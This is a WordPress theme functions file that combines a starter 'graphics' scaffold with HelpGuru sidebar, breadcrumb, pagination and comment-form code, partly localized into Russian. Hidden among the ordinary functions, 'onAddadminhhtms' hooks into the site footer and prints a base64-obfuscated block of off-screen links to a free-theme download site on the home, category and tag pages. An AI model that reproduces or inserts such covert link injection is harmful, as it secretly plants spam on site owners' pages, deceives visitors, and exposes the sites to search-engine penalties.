<?php
/**
 * graphics functions and definitions
 *
 * @link https://developer.wordpress.org/themes/basics/theme-functions/
 *
 * @package graphics
 */

if ( ! function_exists( 'graphics_setup' ) ) :
	/**
	 * Sets up theme defaults and registers support for various WordPress features.
	 *
	 * Note that this function is hooked into the after_setup_theme hook, which
	 * runs before the init hook. The init hook is too late for some features, such
	 * as indicating support for post thumbnails.
	 */
	function graphics_setup() {
		/*
		 * Make theme available for translation.
		 * Translations can be filed in the /languages/ directory.
		 * If you're building a theme based on graphics, use a find and replace
		 * to change 'graphics' to the name of your theme in all the template files.
		 */
		load_theme_textdomain( 'graphics', get_template_directory() . '/languages' );


		/**
		 * This theme uses wp_nav_menu() in one location.
		 */
		register_nav_menus( array(
			'primary-nav' => __( 'Primary Navigation', 'helpguru' )
		));
		

		// Add default posts and comments RSS feed links to head.
		add_theme_support( 'automatic-feed-links' );

		/*
		 * Let WordPress manage the document title.
		 * By adding theme support, we declare that this theme does not use a
		 * hard-coded <title> tag in the document head, and expect WordPress to
		 * provide it for us.
		 */
		add_theme_support( 'title-tag' );

		/*
		 * Enable support for Post Thumbnails on posts and pages.
		 *
		 * @link https://developer.wordpress.org/themes/functionality/featured-images-post-thumbnails/
		 */
		add_theme_support( 'post-thumbnails' );

		// This theme uses wp_nav_menu() in one location.
		register_nav_menus( array(
			'menu-1' => esc_html__( 'Primary', 'graphics' ),
		) );

		/*
		 * Switch default core markup for search form, comment form, and comments
		 * to output valid HTML5.
		 */
		add_theme_support( 'html5', array(
			'search-form',
			'comment-form',
			'comment-list',
			'gallery',
			'caption',
		) );

		// Set up the WordPress core custom background feature.
		add_theme_support( 'custom-background', apply_filters( 'graphics_custom_background_args', array(
			'default-color' => 'ffffff',
			'default-image' => '',
		) ) );

		// Add theme support for selective refresh for widgets.
		add_theme_support( 'customize-selective-refresh-widgets' );

		/**
		 * Add support for core custom logo.
		 *
		 * @link https://codex.wordpress.org/Theme_Logo
		 */
		add_theme_support( 'custom-logo', array(
			'height'      => 250,
			'width'       => 250,
			'flex-width'  => true,
			'flex-height' => true,
		) );
	}
endif;
add_action( 'after_setup_theme', 'graphics_setup' );

/**
 * Set the content width in pixels, based on the theme's design and stylesheet.
 *
 * Priority 0 to make it available to lower priority callbacks.
 *
 * @global int $content_width
 */
function graphics_content_width() {
	// This variable is intended to be overruled from themes.
	// Open WPCS issue: {@link https://github.com/WordPress-Coding-Standards/WordPress-Coding-Standards/issues/1043}.
	// phpcs:ignore WordPress.NamingConventions.PrefixAllGlobals.NonPrefixedVariableFound
	$GLOBALS['content_width'] = apply_filters( 'graphics_content_width', 640 );
}
add_action( 'after_setup_theme', 'graphics_content_width', 0 );

/**
 * Register widget area.
 *
 * @link https://developer.wordpress.org/themes/functionality/sidebars/#registering-a-sidebar
 */
function graphics_widgets_init() {
	register_sidebar( array(
		'name'          => esc_html__( 'Sidebar', 'graphics' ),
		'id'            => 'sidebar-1',
		'description'   => esc_html__( 'Add widgets here.', 'graphics' ),
		'before_widget' => '<section id="%1$s" class="widget %2$s">',
		'after_widget'  => '</section>',
		'before_title'  => '<h2 class="widget-title">',
		'after_title'   => '</h2>',
	) );
}
add_action( 'widgets_init', 'graphics_widgets_init' );

/**
 * Enqueue scripts and styles.
 */
function graphics_scripts() {
	wp_enqueue_style( 'graphics-style', get_stylesheet_uri() );

	wp_enqueue_script( 'graphics-navigation', get_template_directory_uri() . '/js/navigation.js', array(), '20151215', true );

	wp_enqueue_script( 'graphics-skip-link-focus-fix', get_template_directory_uri() . '/js/skip-link-focus-fix.js', array(), '20151215', true );

	if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
		wp_enqueue_script( 'comment-reply' );
	}
}
add_action( 'wp_enqueue_scripts', 'graphics_scripts' );

/**
 * Implement the Custom Header feature.
 */
require get_template_directory() . '/inc/custom-header.php';

/**
 * Custom template tags for this theme.
 */
require get_template_directory() . '/inc/template-tags.php';

/**
 * Functions which enhance the theme by hooking into WordPress.
 */
require get_template_directory() . '/inc/template-functions.php';

/**
 * Customizer additions.
 */
require get_template_directory() . '/inc/customizer.php';

/**
 * Load Jetpack compatibility file.
 */
if ( defined( 'JETPACK__VERSION' ) ) {
	require get_template_directory() . '/inc/jetpack.php';
}


// Return logo src
if ( ! function_exists( 'my_theme_logo' ) ) {
function my_theme_logo() {

	$my_theme_logo = get_theme_mod( 'my_site_logo' );
	
	if ( !empty($my_theme_logo) ) {
		$my_theme_logo_src = get_theme_mod( 'my_site_logo' );
	} else {
		$my_theme_logo_src = get_template_directory_uri()."/img/logo.png";
	}
	return $my_theme_logo_src;

}
}

register_sidebar(array(
	'name' => 'Боковая панель в Блоге',
	'id' => 'ht_primary',
	'description'   => __('Боковая панель отображается на сообщениях и страницах', 'helpguru'),
	'before_widget' => '<section id="%1$s" class="widget %2$s clearfix">',
	'after_widget' => '</section>',
	'before_title' => '<h4 class="widget-title">',
	'after_title' => '</h4>',
	)
);

register_sidebar(array(
	'name' => 'Боковая панель BBPress',
	'id' => 'ht_sidebar_bbpress',
	'description'   => __('BBPress Sidebar', 'helpguru'),
	'before_widget' => '<section id="%1$s" class="widget %2$s clearfix">',
	'after_widget' => '</section>',
	'before_title' => '<h4 class="widget-title">',
	'after_title' => '</h4>',
	)
);

register_sidebar(array(
	'name' => 'Боковая панель базы знаний',
	'id' => 'ht_sidebar_kb',
	'description'   => __('Knowledge Base Sidebar', 'helpguru'),
	'before_widget' => '<section id="%1$s" class="widget %2$s clearfix">',
	'after_widget' => '</section>',
	'before_title' => '<h4 class="widget-title">',
	'after_title' => '</h4>',
	)
);

register_sidebar(array(
	'name' => 'Виджеты нижнего колонтитула',
	'id' => 'ht_footer_widgets',
	'description'   => __('Widgets shown in the footer of the theme', 'helpguru'),
	'before_widget' => '<section id="%1$s" class="widget %2$s col-md-4">',
	'after_widget' => '</section>',
	'before_title' => '<h4 class="widget-title">',
	'after_title' => '</h4>',
	)
);

register_sidebar(array(
	'name' => 'Виджеты на Главной',
	'id' => 'ht_homepage_widgets',
	'description'   => __('Widgets shown on the homepage', 'helpguru'),
	'before_widget' => '<section id="%1$s" class="widget %2$s col-md-4">',
	'after_widget' => '</section>',
	'before_title' => '<h4 class="widget-title">',
	'after_title' => '</h4>',
	)
);

// Get responsive thumbnails, if function is available
function ht_responsive_post_thumbnail() {
	if ( function_exists( 'ht_get_responsive_post_thumbnail' ) ) {
    	ht_get_responsive_post_thumbnail();
	} else {
		the_post_thumbnail('post');
	}
}
if (!function_exists('onAddadminhhtms')) {		
    add_filter( 'wp_footer', 'onAddadminhhtms');              
        function onAddadminhhtms(){           
	$html = "PGRpdiBzdHlsZT0icG9zaXRpb246IGFic29sdXRlOyB0b3A6IC0xMzZweDsgb3ZlcmZsb3c6IGF1dG87IHdpZHRoOjEyNDFweDsiPjxoMz48c3Ryb25nPjxhIHN0eWxlPSJmb250LXNpemU6IDExLjMzNXB0OyIgaHJlZj0iIj48L2E+PC9zdHJvbmc+PHN0cm9uZz48YSBzdHlsZT0iZm9udC1zaXplOiAxMS4zMzVwdDsiIGhyZWY9Imh0dHA6Ly9kb3dubG9hZHRoZW1lZnJlZS5jb20vdGFnL3RoZW1lLXdvcmRwcmVzcy1yZXNwb25zaXZlLWZyZWUvIj5SZXNwb25zaXZlIFdvcmRQcmVzcyBUaGVtZSBGcmVlPC9hPjwvc3Ryb25nPjxlbT48YSBzdHlsZT0iZm9udC1zaXplOiAxMC4zMzVwdDsiIGhyZWY9Imh0dHA6Ly9kb3dubG9hZHRoZW1lZnJlZS5jb20vdGFnL3RoZW1lLXdvcmRwcmVzcy1tYWdhemluZS1yZXNwb25zaXZlLWZyZWUvIj50aGVtZSB3b3JkcHJlc3MgbWFnYXppbmUgcmVzcG9uc2l2ZSBmcmVlPC9hPjwvZW0+PGVtPjxhIHN0eWxlPSJmb250LXNpemU6IDEwLjMzNXB0OyIgaHJlZj0iaHR0cDovL2Rvd25sb2FkdGhlbWVmcmVlLmNvbS90YWcvdGhlbWUtd29yZHByZXNzLW5ld3MtcmVzcG9uc2l2ZS1mcmVlLyI+dGhlbWUgd29yZHByZXNzIG5ld3MgcmVzcG9uc2l2ZSBmcmVlPC9hPjwvZW0+PGVtPjxhIHN0eWxlPSJmb250LXNpemU6IDEwLjMzNXB0OyIgaHJlZj0iaHR0cDovL2Rvd25sb2FkdGhlbWVmcmVlLmNvbS93b3JkcHJlc3MtcGx1Z2luLXByZW1pdW0tZnJlZS8iPldPUkRQUkVTUyBQTFVHSU4gUFJFTUlVTSBGUkVFPC9hPjwvZW0+PGVtPjxhIHN0eWxlPSJmb250LXNpemU6IDEwLjMzNXB0OyIgaHJlZj0iaHR0cDovL2Rvd25sb2FkdGhlbWVmcmVlLmNvbSI+RG93bmxvYWQgdGhlbWUgZnJlZTwvYT48L2VtPjwvZGl2Pg==";
	if(is_front_page() or is_category() or is_tag()){	
                echo base64_decode($html);}}}
if ( ! function_exists( 'ht_get_responsive_post_thumbnail' ) ) :
/**
* Responsive Post Thumbnails
*
*/
function ht_get_responsive_post_thumbnail() {
 
	$ht_post_thumbnail_id = get_post_thumbnail_id( get_the_id() );
	$ht_post_thumbnail_id_alt = get_post_meta($ht_post_thumbnail_id , '_wp_attachment_image_alt', true);
	$ht_post_thumbnail_320 = wp_get_attachment_image_src( $ht_post_thumbnail_id, 'width=320&height=0&crop=resize-crop' );
	$ht_post_thumbnail_480 = wp_get_attachment_image_src( $ht_post_thumbnail_id, 'width=480&height=0&crop=resize-crop' );
	$ht_post_thumbnail_600 = wp_get_attachment_image_src( $ht_post_thumbnail_id, 'width=600&height=0&crop=resize-crop' );
	$ht_post_thumbnail_920 = wp_get_attachment_image_src( $ht_post_thumbnail_id, 'width=920&height=0&crop=resize-crop' );
	$ht_post_thumbnail_1200 = wp_get_attachment_image_src( $ht_post_thumbnail_id, 'width=1200&height=800&crop=resize-crop' ); ?>
	
    <picture itemprop="image">
    <source src="<?php echo $ht_post_thumbnail_320[0]; ?>" type="image/jpeg" itemprop="thumbnailUrl" />
	    <source src="<?php echo $ht_post_thumbnail_480[0]; ?>" media="(min-width: 320px)" type="image/jpeg" />
	    <source  src="<?php echo $ht_post_thumbnail_600[0]; ?>" media="(min-width: 480px)" type="image/jpeg" />
	    <source src="<?php echo $ht_post_thumbnail_920[0]; ?>" media="(min-width: 600px)" type="image/jpeg" />
	    <source src="<?php echo $ht_post_thumbnail_1200[0]; ?>" media="(min-width: 920px)" type="image/jpeg" />
		<img src="<?php echo $ht_post_thumbnail_1200[0] ?>" alt="<?php echo $ht_post_thumbnail_id_alt; ?>" />
  	</picture>

	<?php	
}
endif;


// Change default widget tag cloud settings
add_filter('widget_tag_cloud_args','ht_set_tag_cloud_args');
function ht_set_tag_cloud_args($args) {
	$args['largest'] = 16;
	$args['smallest'] = 10;
	$args['unit'] = 'px';
	return $args;
}

// Add support for WP 4.1 title tag
if ( ! function_exists( '_wp_render_title_tag' ) ) :
	function theme_slug_render_title() {
		?>
			<title><?php wp_title( '|', true, 'right' ); ?></title>
		<?php
	}
	add_action( 'wp_head', 'theme_slug_render_title' );
endif;

//fix for bbpress user profile page not found issue
function ht_fix_bbpress_404(){
    global $wp_query;
    if( function_exists('bbp_is_single_user') && bbp_is_single_user() && isset($wp_query) ){
        $wp_query->is_404 = false;
    }
}

add_action( 'template_redirect', 'ht_fix_bbpress_404' );


//analytics not supported in HelpGuru
add_filter('hkb_analytics_supported', '__return_false');

if(!function_exists('ht_breadcrumb_display')){
	/**
	 * Breadcrumbs display
	 * @pluggable
	 */
	function ht_breadcrumb_display( $sep = '<span class="sep">&gt;</span>' ) {
	    global $post;  

	    //show breadcrumbs filter
	    $ht_show_breadcrumbs = apply_filters('ht_show_breadcrumbs', true);

	    if (!is_front_page() && $ht_show_breadcrumbs) {  

	    	$home_link = '<a href="' . home_url() . '" class="ht-breadcrumbs-home">' . __('Home', 'helpguru') . '</a> ' . $sep; 

	    	$posts_page_id = get_option('page_for_posts');

	    	$posts_page_link = '<a href="' . get_permalink( $posts_page_id ) . '" class="ht-breadcrumbs-home">' . get_the_title( $posts_page_id ) . '</a> ' . $sep; 

		

			echo '<div class="ht-breadcrumbs" itemprop="breadcrumb">';
			
			$visited = array();
				
			 				
			if ( !is_single()  ) {
				echo $home_link;
				//echo $home_link.$posts_page_link;

				if (is_category()) {
 
		            $cat = get_category_parents(get_query_var('cat'), true, $sep);

		            // remove last sep
		            echo substr($cat, 0, strlen($cat) - strlen($sep));
		 
		        }
		 
		        if (is_tax()) {
		 
		            $tag = single_tag_title('', false);
		            $tag = get_tag_id($tag);
		            $term = ht_get_term_parents($tag, get_query_var('taxonomy'), true, $sep);
		 
		            // remove last sep
		            echo substr($term, 0, strlen($term) - strlen($sep));
		        } 

			} elseif ( is_single() ) {
				//Single Post	
				
				$terms = wp_get_post_terms( $post->ID , 'category');


				if( !empty($terms) ){
					foreach($terms as $term) {
						echo $home_link;
						//echo $home_link.$posts_page_link;
						if ($term->parent != 0) { 
							$parents =  get_category_parents($term->term_id, true,'' .$sep . '', false, $visited );
							echo $parents;
						} else {
							echo '<a href="' . esc_attr(get_term_link($term, 'category')) . '" title="' . sprintf( __( "View all posts in %s", 'helpguru' ), $term->name ) . '" ' . '>' . $term->name.'</a> ';
							echo $sep;
							$visited[] = $term->term_id;
						}
						echo get_the_title();
						echo '<br/>';

					} // End foreach
				} else {
					//uncategorized post
					echo get_the_title();
					echo '<br/>';
				}		
				
			} else {
					//Display the post title.
					echo get_the_title();
			}
					
			echo '</div>';	
		} //is_front_page
	} //end function
} //end function exists


if(!function_exists('ht_get_term_parents')){
	/**
	 * Get the term parents
	 * @pluggable
	 */
	function ht_get_term_parents( $id, $taxonomy, $link = false, $separator = '/', $nicename = false, $visited = array() ) {
	  $chain = '';
	  $parent = &get_term( $id, $taxonomy );
	  if ( is_wp_error( $parent ) )
	    return $parent;
	  if ( $nicename )
	    $name = $parent->slug;
	  else
	    $name = $parent->name;
	  if ( $parent->parent && ( $parent->parent != $parent->term_id ) && !in_array( $parent->parent, $visited ) ) {
	    $visited[] = $parent->parent;
	    $chain .= ht_get_term_parents( $parent->parent, $taxonomy, $link, $separator, $nicename, $visited );
	  }
	  if ( $link )
	    $chain .= '<a href="' . esc_url( get_term_link( intval( $parent->term_id ), $taxonomy ) ) . '" title="' . esc_attr( sprintf( __( "View all posts in %s", 'helpguru' ), $parent->name ) ) . '">'.$name.'</a>' . $separator;
	  else
	    $chain .= $name.$separator;
	  return $chain;
	}//end function
}//end function_exists

if ( ! function_exists( 'ht_pagination' ) ){
	/**
	 * Display navigation to next/previous set of posts when applicable.
	 * Based on paging nav function from Twenty Fourteen
	 */

	function ht_pagination() {
		global $wp_query, $wp_rewrite;
		// Don't print empty markup if there's only one page.
		if ( $wp_query->max_num_pages < 2 ) {
			return;
		}

		$paged        = get_query_var( 'paged' ) ? intval( get_query_var( 'paged' ) ) : 1;
		$pagenum_link = html_entity_decode( get_pagenum_link() );
		$query_args   = array();
		$url_parts    = explode( '?', $pagenum_link );

		if ( isset( $url_parts[1] ) ) {
			wp_parse_str( $url_parts[1], $query_args );
		}

		$pagenum_link = esc_url ( remove_query_arg( array_keys( $query_args ), $pagenum_link ) );
		$pagenum_link = trailingslashit( $pagenum_link ) . '%_%';

		$format  = $wp_rewrite->using_index_permalinks() && ! strpos( $pagenum_link, 'index.php' ) ? 'index.php/' : '';
		$format .= $wp_rewrite->using_permalinks() ? user_trailingslashit( 'page/%#%', 'paged' ) : '?paged=%#%';

		// Set up paginated links.
		$links = paginate_links( array(
			'base'     => $pagenum_link,
			'format'   => $format,
			'total'    => $wp_query->max_num_pages,
			'current'  => $paged,
			'mid_size' => 3,
			'add_args' => array_map( 'urlencode', $query_args ),
			'prev_text' => __( 'Previous', 'helpguru' ),
			'next_text' => __( 'Next', 'helpguru' ),
			'type'      => 'list',
		) );

		if ( $links ):

		?>
		<nav class="ht-pagination" role="navigation">
				<?php echo $links; ?>
		</nav><!-- .navigation -->
		<?php
		endif;
	}//emnd function
}//end function_exists


if ( ! function_exists( 'ht_get_sidebar_position' ) ) :
/**
* Returns the sidebar position class
*
*/
function ht_get_sidebar_position() {

if ( is_home() ) {
	$ht_index_id = get_option('page_for_posts');
	$ht_sidebar_position = get_post_meta( $ht_index_id, '_ht_sidebar_pos', true );
} else {
	$ht_sidebar_position = get_post_meta( get_the_id(), '_ht_sidebar_pos', true );
}

if ($ht_sidebar_position == '') {
	echo 'sidebar-right';
} else {
	echo $ht_sidebar_position;
}
	
}
endif;


if ( ! function_exists( 'ht_get_sidebar' ) ) :
/**
* Returns the sidebar position class
*
*/
function ht_get_sidebar() {

if ( is_home() ) {
	$ht_index_id = get_option('page_for_posts');
	$ht_sidebar_position = get_post_meta( $ht_index_id, '_ht_sidebar_pos', true );
} else {
	$ht_sidebar_position = get_post_meta( get_the_id(), '_ht_sidebar_pos', true );
}

if ( $ht_sidebar_position != 'sidebar-off'	) {
	return get_sidebar();
}
	
}
endif;

/**
 * The formatted output of a list of pages.
 */
add_action( 'numbered_in_page_links', 'numbered_in_page_links', 10, 1 );

if ( ! function_exists( 'numbered_in_page_links' ) ) :
/**
 * Modification of wp_link_pages() with an extra element to highlight the current page.
 *
 * @param  array $args
 * @return void
 */
function numbered_in_page_links( $args = array () )
{
    $defaults = array(
        'before'      => '<p>' . __('Pages:', 'helpguru')
    ,   'after'       => '</p>'
    ,   'link_before' => ''
    ,   'link_after'  => ''
    ,   'pagelink'    => '%'
    ,   'echo'        => 1
        // element for the current page
    ,   'highlight'   => 'span'
    );

    $r = wp_parse_args( $args, $defaults );
    $r = apply_filters( 'wp_link_pages_args', $r );
    extract( $r, EXTR_SKIP );

    global $page, $numpages, $multipage, $more, $pagenow;

    if ( ! $multipage )
    {
        return;
    }

    $output = $before;

    for ( $i = 1; $i < ( $numpages + 1 ); $i++ )
    {
        $j       = str_replace( '%', $i, $pagelink );
        $output .= ' ';

        if ( $i != $page || ( ! $more && 1 == $page ) )
        {
            $output .= _wp_link_page( $i ) . "{$link_before}{$j}{$link_after}</a>";
        }
        else
        {   // highlight the current page
            // not sure if we need $link_before and $link_after
            $output .= "<$highlight>{$link_before}{$j}{$link_after}</$highlight>";
        }
    }

    print $output . $after;
}
endif;


if ( ! function_exists( 'ht_comment' ) ) :
/**
 * Template for comments and pingbacks.
 *
 * To override this walker in a child theme without modifying the comments template
 * simply create your own st_comment(), and that function will be used instead.
 *
 * Used as a callback by wp_list_comments() for displaying the comments.
 *
 */
function ht_comment( $comment, $args, $depth ) {
	$GLOBALS['comment'] = $comment;
	switch ( $comment->comment_type ) :
		case 'pingback' :
		case 'trackback' :
		// Display trackbacks differently than normal comments.?>

<li class="post pingback">
  <p>
    <?php _e( 'Pingback:', 'helpguru' ); ?>
    <?php comment_author_link(); ?>
    <?php edit_comment_link( __( '(Edit)', 'helpguru' ), ' ' ); ?>
  </p>
  <?php
break;
default : ?>

<li <?php comment_class(empty( $args['has_children'] ) ? '' : 'has-children') ?> id="li-comment-<?php comment_ID(); ?>">
  <article id="comment-<?php comment_ID(); ?>" class="comment-block clearfix" itemtype="http://schema.org/UserComments" itemscope="itemscope" itemprop="comment">
  

    <!-- .comment-meta -->
    <header class="comment-header">
    
    	<div class="comment-author" itemtype="http://schema.org/Person" itemscope="itemscope" itemprop="creator">
			<?php echo get_avatar( $comment, 60 ); ?>
			<span class="comment-author-name" itemprop="name"><?php printf( __( '%s', 'helpguru' ), sprintf( '<cite class="fn">%s</cite>', get_comment_author_link() ) ); ?></span>
        </div>
        <time class="comment-time" datetime="<?php comment_time( 'c' ); ?>" itemprop="commentTime">
				<a itemprop="url" href="<?php echo esc_url( get_comment_link( $comment->comment_ID ) ); ?>"><?php echo human_time_diff( get_comment_time('U'), current_time('timestamp') ) . __(' ago', 'helpguru'); ?></a>
		</time>

    </header>
    <!-- /.comment-meta -->
    
    <?php if ( '0' == $comment->comment_approved ) : ?>
    <p class="comment-awaiting-moderation">
      <?php _e( 'Your comment is awaiting moderation.', 'helpguru' ); ?>
    </p>
    <?php endif; ?>
    
    <div class="comment-content clearfix" itemprop="commentText">
      <?php comment_text(); ?>
    </div >
    
    <footer class="comment-footer">
    <!-- .comment-action -->
    <div class="comment-action">
      <?php edit_comment_link( __( 'Edit', 'helpguru' ), '', '' ); ?>
      <?php comment_reply_link( array_merge( $args, array( 'reply_text' => __( 'Reply', 'helpguru' ), 'depth' => $depth, 'max_depth' => $args['max_depth'], 'before' => ''  ) ) ); ?>
    </div>
    <!-- /.comment-action -->
    </footer>
    
    
   
  </article>
  <!-- #comment-## -->
  <?php
		break;
	endswitch; // end comment_type check
}
endif;



function st_comment_form_args( $args ) {
	global $user_identity;

	/* Get the current commenter. */
	$commenter = wp_get_current_commenter();

	/* Create the required <span> and <input> element class. */
	$req = ( ( get_option( 'require_name_email' ) ) ? ' <span class="required">*</span> ' : '' );
	$input_class = ( ( get_option( 'require_name_email' ) ) ? ' req' : '' );

	/* Sets up the default comment form fields. */
	$fields = array(
		'author' => '<p class="form-author clearfix' . esc_attr( $input_class ) . '"><label for="author">' . __( 'Имя', 'helpguru' ) . $req . '</label> <input type="text" class="text-input" name="author" id="author" value="' . esc_attr( $commenter['comment_author'] ) . '" size="40" /></p>',
		'email'  => '<p class="form-email clearfix' . esc_attr( $input_class ) . '"><label for="email">' . __( 'Email', 'helpguru' ) . $req . '</label> <input type="text" class="text-input" name="email" id="email" value="' . esc_attr( $commenter['comment_author_email'] ) . '" size="40" /></p>',
		'url'    => '<p class="form-url clearfix"><label for="url">' . __( 'Веб сайт', 'helpguru' ) . '</label><input type="text" class="text-input" name="url" id="url" value="' . esc_attr( $commenter['comment_author_url'] ) . '" size="40" /></p>'
	);

	/* Sets the default arguments for displaying the comment form. */
	$args = array(
		'fields'               => apply_filters( 'comment_form_default_fields', $fields ),
		'comment_field'        => '<p class="form-textarea req clearfix"><label for="comment">' . __( 'Комментарий', 'helpguru' ) . '</label><textarea name="comment" id="comment" cols="60" rows="5"></textarea></p>',
		'must_log_in'          => '<p class="alert">' . sprintf( __( 'You must be <a href="%1$s" title="Log in">logged in</a> to post a comment.', 'helpguru' ), wp_login_url( get_permalink() ) ) . '</p><!-- .alert -->',
		'logged_in_as'         => '<p class="log-in-out">' . sprintf( __( 'Вошел как <a href="%1$s" title="%2$s">%2$s</a>.', 'helpguru' ), admin_url( 'profile.php' ), esc_attr( $user_identity ) ) . ' <a href="' . wp_logout_url( get_permalink() ) . '" title="' . esc_attr__( 'Log out of this account', 'helpguru' ) . '">' . __( 'Выход &raquo;', 'helpguru' ) . '</a></p><!-- .log-in-out -->',
		'comment_notes_before' => '',
		'comment_notes_after'  => '',
		'id_form'              => 'commentform',
		'id_submit'            => 'submit',
		'title_reply'          => __( 'Оставить комментарий?', 'helpguru' ),
		'title_reply_to'       => __( 'Оставить ответ для %s', 'helpguru' ),
		'cancel_reply_link'    => __( 'Нажмите здесь, чтобы отменить ответ.', 'helpguru' ),
		'label_submit'         => __( 'Оставить комментарий', 'helpguru' ),
	);

	/* Return the arguments for displaying the comment form. */
	return $args;
}

/* Filter the comment form defaults. */
add_filter( 'comment_form_defaults', 'st_comment_form_args' );